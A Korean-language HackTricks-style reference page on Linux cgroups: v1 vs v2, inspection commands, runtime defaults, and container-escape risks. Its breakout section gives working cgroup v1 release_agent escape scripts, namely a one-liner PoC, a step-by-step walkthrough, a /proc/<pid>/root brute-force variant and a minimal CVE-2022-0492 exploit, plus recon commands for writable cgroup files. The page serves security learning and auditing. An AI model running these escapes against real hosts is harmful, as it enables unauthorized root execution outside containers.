# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux **control groups**는 회계(accounting), 제한(limiting), 우선순위 결정(prioritization), 정책 집행(policy enforcement)을 위해 프로세스를 묶는 커널 메커니즘이다. namespaces가 주로 리소스의 뷰를 격리하는 것과 관련 있다면, cgroups는 주로 특정 프로세스 집합이 해당 리소스를 **얼마나** 소비할 수 있는지를 통제하고, 경우에 따라 **어떤 종류의 리소스**와 상호작용할 수 있는지를 규정한다. 컨테이너는 사용자가 직접 보지 않더라도 거의 모든 현대 runtime이 커널에 "이 프로세스들은 이 워크로드에 속하며, 이들이 적용받는 리소스 규칙은 다음과 같다"라고 알릴 필요가 있기 때문에 cgroups에 지속적으로 의존한다.

이 때문에 container engines는 새 컨테이너를 자체 cgroup 서브트리에 넣는다. 프로세스 트리가 그곳에 배치되면 런타임은 메모리 한도 설정, PIDs 수 제한, CPU 사용량 가중치 부여, I/O 조절, 디바이스 접근 제한 등을 할 수 있다. 운영 환경에서는 이것이 다중 테넌트 보안과 기본적인 운영 관리 모두에 필수적이다. 의미 있는 리소스 제어가 없는 컨테이너는 메모리를 고갈시키거나, 프로세스로 시스템을 범람시키거나, 호스트나 인접 워크로드를 불안정하게 만드는 방식으로 CPU와 I/O를 독점할 수 있다.

보안 관점에서 cgroups는 두 가지 측면에서 중요하다. 첫째, 부실하거나 누락된 리소스 제한은 단순한 서비스 거부(denial-of-service) 공격을 가능하게 한다. 둘째, 특히 오래된 **cgroup v1** 환경에서는 일부 cgroup 기능이 컨테이너 내부에서 쓰기 가능할 경우 강력한 탈출 프리미티브를 만들어낸 사례가 역사적으로 존재했다.

## v1 Vs v2

현장에는 두 가지 주요 cgroup 모델이 있다. **cgroup v1**은 여러 컨트롤러 계층을 노출하며, 오래된 익스플로잇 설명들은 종종 그곳에서 제공되는 이상하고 때로는 과도하게 강력한 의미론(semantics)을 중심으로 전개된다. **cgroup v2**는 더 통합된 계층과 일반적으로 더 깔끔한 동작을 도입한다. 최신 배포판은 점점 cgroup v2를 선호하지만, 혼합된 또는 레거시 환경이 여전히 존재하므로 실제 시스템을 검토할 때 두 모델 모두 여전히 관련성이 있다.

이 차이가 중요한 이유는 cgroup v1의 **`release_agent`** 남용 같은 가장 유명한 컨테이너 탈출 사례들이 매우 구체적으로 오래된 cgroup 동작에 연결되어 있기 때문이다. 블로그에서 cgroup 익스플로잇을 보고 이를 맹목적으로 최신의 cgroup v2 전용 시스템에 적용하면, 대상에서 실제로 가능한 것을 오해할 가능성이 높다.

## 검사

현재 셸이 어디에 속해 있는지 가장 빠르게 확인하는 방법은 다음과 같다:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 파일은 현재 프로세스와 연관된 cgroup 경로를 보여줍니다. 최신 cgroup v2 호스트에서는 보통 통합 항목이 표시됩니다. 구형 또는 하이브리드 호스트에서는 여러 v1 컨트롤러 경로가 보일 수 있습니다. 경로를 알게 되면 `/sys/fs/cgroup` 아래의 해당 파일들을 검사하여 제한과 현재 사용량을 확인할 수 있습니다.

cgroup v2 호스트에서는 다음 명령어들이 유용합니다:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
이 파일들은 어떤 controllers가 존재하는지 그리고 어떤 것들이 child cgroups로 위임(delegated)되었는지를 보여준다. 이러한 위임 모델은 rootless 및 systemd-managed 환경에서 중요하다. 이러한 환경에서는 runtime이 상위 계층(parent hierarchy)이 실제로 위임한 cgroup 기능의 부분집합만 제어할 수 있기 때문이다.

## Lab

cgroups를 실제로 관찰하는 한 가지 방법은 메모리 제한이 설정된 컨테이너를 실행하는 것이다:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID 제한된 컨테이너를 시도해 볼 수도 있습니다:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Usage

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

고전적인 cgroup 보안 이슈는 쓰기 가능한 **cgroup v1 `release_agent`** 메커니즘입니다. 이 모델에서는 공격자가 적절한 cgroup 파일에 쓸 수 있고, `notify_on_release`를 활성화하며 `release_agent`에 저장된 경로를 제어할 수 있다면, cgroup이 비었을 때 커널이 호스트의 초기 네임스페이스에서 공격자가 지정한 경로를 실행할 수 있습니다. 그래서 이전의 분석들은 cgroup 컨트롤러의 쓰기 가능성, 마운트 옵션, 네임스페이스/권한 조건에 많은 주의를 기울였습니다.

`release_agent`가 없더라도 cgroup 설정 실수는 여전히 중요합니다. 지나치게 넓은 device 접근 권한은 컨테이너에서 호스트 장치에 접근 가능하게 만들 수 있습니다. 메모리 및 PID 제한 누락은 단순한 코드 실행을 호스트 DoS로 바꿔버릴 수 있습니다. 루트리스(rootless) 시나리오에서의 약한 cgroup 위임은 런타임이 실제로 제한을 적용하지 못했음에도 수비자에게 제한이 존재한다고 오도할 수 있습니다.

### `release_agent` Background

`release_agent` 기술은 **cgroup v1**에만 적용됩니다. 기본 아이디어는 마지막 프로세스가 cgroup에서 종료되고 `notify_on_release=1`로 설정되어 있을 때, 커널이 `release_agent`에 저장된 경로에 있는 프로그램을 실행한다는 것입니다. 그 실행은 **호스트의 초기 네임스페이스에서** 발생하므로, 쓰기 가능한 `release_agent`는 컨테이너 탈출 원시 수단이 됩니다.

이 기법이 작동하려면 공격자는 일반적으로 다음을 필요로 합니다:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
이 PoC는 payload path를 `release_agent`에 기록하고, cgroup release를 트리거한 뒤 호스트에서 생성된 출력 파일을 읽어옵니다.

### 읽기 쉬운 워크스루

같은 아이디어를 단계별로 나누면 더 이해하기 쉽습니다.

1. writable cgroup을 생성하고 준비합니다:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 컨테이너 파일 시스템에 해당하는 호스트 경로를 식별하세요:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. host path에서 보이도록 payload를 배치합니다:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup을 비워 실행을 트리거합니다:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
그 결과는 payload가 host 측에서 host root privileges로 실행되는 것입니다. 실제 exploit에서는 payload가 보통 proof file을 작성하거나 reverse shell을 생성하거나 host state를 변경합니다.

### `/proc/<pid>/root`을(를) 이용한 Relative Path Variant

일부 환경에서는 container filesystem에 대한 host 경로가 명확하지 않거나 storage driver에 의해 숨겨져 있을 수 있습니다. 그런 경우 payload 경로는 `/proc/<pid>/root/...`를 통해 표현할 수 있으며, 여기서 `<pid>`는 현재 container 내 프로세스에 해당하는 host PID입니다. 이것이 relative-path brute-force variant의 기반입니다:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
해당 트릭은 무차별 대입 자체가 아니라 경로 형태에 있다: `/proc/<pid>/root/...`는 kernel이 직접적인 host storage path를 미리 알지 못하더라도 host namespace에서 container filesystem 내부의 파일을 resolve할 수 있게 한다.

### CVE-2022-0492 변형

2022년에 CVE-2022-0492는 cgroup v1에서 `release_agent`에 쓰기할 때 `CAP_SYS_ADMIN`을 **initial** user namespace에서 올바르게 검사하지 않았음을 보여주었다. 이로 인해 cgroup 계층을 mount할 수 있는 container 프로세스는 호스트 user namespace에서 이미 권한이 없어도 `release_agent`를 쓸 수 있었기 때문에, 취약한 kernel에서는 해당 기법에 훨씬 더 접근하기 쉬워졌다.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
취약한 커널에서는 호스트가 `/proc/self/exe`를 호스트 루트 권한으로 실행합니다.

실제 악용을 위해서는, 환경이 여전히 쓰기 가능한 cgroup-v1 경로나 위험한 장치 접근을 노출하는지부터 확인하세요:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
`release_agent`가 존재하고 쓰기 가능한 경우, 이미 legacy-breakout 영역에 있습니다:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
만약 cgroup path 자체가 escape로 이어지지 않는다면, 다음으로 실용적인 사용은 종종 denial of service 또는 reconnaissance입니다:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
## 검사

이 명령들은 워크로드가 fork-bomb을 실행할 여지가 있는지, 메모리를 공격적으로 사용할 수 있는지, 또는 쓰기 가능한 레거시 cgroup 인터페이스를 남용할 수 있는지를 빠르게 알려준다.

대상을 검토할 때, cgroup 검사의 목적은 어떤 cgroup 모델이 사용되는지, 컨테이너가 쓰기 가능한 controller 경로를 보는지, 그리고 `release_agent`와 같은 오래된 breakout 프리미티브가 관련성이 있는지 여부를 파악하는 것이다.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
여기서 흥미로운 점:

- If `mount | grep cgroup` shows **cgroup v1**, 오래된 breakout writeup들이 더 관련성이 높아진다.
- If `release_agent` exists and is reachable, 그건 즉시 더 깊은 조사 가치가 있다.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, 그 환경은 훨씬 더 면밀한 검토가 필요하다.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, 그 조합은 주의 깊은 관찰이 필요하다. cgroups는 종종 지루한 자원 관리 주제로 취급되지만, 역사적으로는 "자원 제어"와 "호스트 영향" 사이의 경계가 사람들 생각만큼 명확하지 않았기 때문에 가장 교훈적인 container escape 체인의 일부였던 적이 있다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화됨 | 컨테이너는 자동으로 cgroups에 배치됨; 리소스 제한은 플래그로 설정하지 않으면 선택사항 | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | 기본적으로 활성화됨 | 기본값은 `--cgroups=enabled`; cgroup namespace 기본값은 cgroup 버전에 따라 다름(`private`는 cgroup v2에서, `host`는 일부 cgroup v1 설정에서) | `--cgroups=disabled`, `--cgroupns=host`, 장치 접근 완화, `--privileged` |
| Kubernetes | 런타임을 통해 기본적으로 활성화됨 | Pod와 컨테이너는 노드 런타임에 의해 cgroups에 배치됨; 세분화된 리소스 제어는 `resources.requests` / `resources.limits`에 의존 | 리소스 requests/limits 누락, 특권 장치 접근, 호스트 수준 런타임 잘못된 구성 |
| containerd / CRI-O | 기본적으로 활성화됨 | cgroups는 일반 수명주기 관리의 일부 | 직접 런타임 구성으로 장치 제어를 완화하거나 레거시 쓰기 가능한 cgroup v1 인터페이스를 노출 |

중요한 차이점은 **cgroup 존재**는 보통 기본이며, 반면 **유용한 리소스 제약**은 명시적으로 구성되지 않는 한 종종 선택적이라는 점이다.
{{#include ../../../../banners/hacktricks-training.md}}
